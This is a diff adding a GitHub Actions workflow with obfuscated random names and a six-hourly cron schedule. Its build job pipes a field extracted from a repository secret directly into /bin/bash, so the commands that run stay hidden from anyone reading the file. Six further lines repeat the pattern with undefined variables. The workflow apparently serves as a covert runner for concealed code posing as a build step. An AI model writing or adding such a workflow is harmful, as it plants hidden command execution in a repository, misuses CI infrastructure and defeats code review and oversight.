@@ -1,0 +1,23 @@
+name: zhaorushan0987
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaorushan0987
+        env:
+          pnwax537: ${{ secrets.pnwax537 }}
+        run: |
+          echo $pnwax537 | jq -r .np9 | /bin/bash
+          echo $u6857 | jq -r .tmckl2161 | /bin/bash
+          echo $mhij82155 | jq -r .mdrn4868 | /bin/bash
+          echo $mpaqa82 | jq -r .mhfl898 | /bin/bash
+          echo $v704 | jq -r .psryt2335 | /bin/bash
+          echo $mdedu542 | jq -r .nz044 | /bin/bash
+          echo $frwt19719 | jq -r .jwl4638 | /bin/bash
+
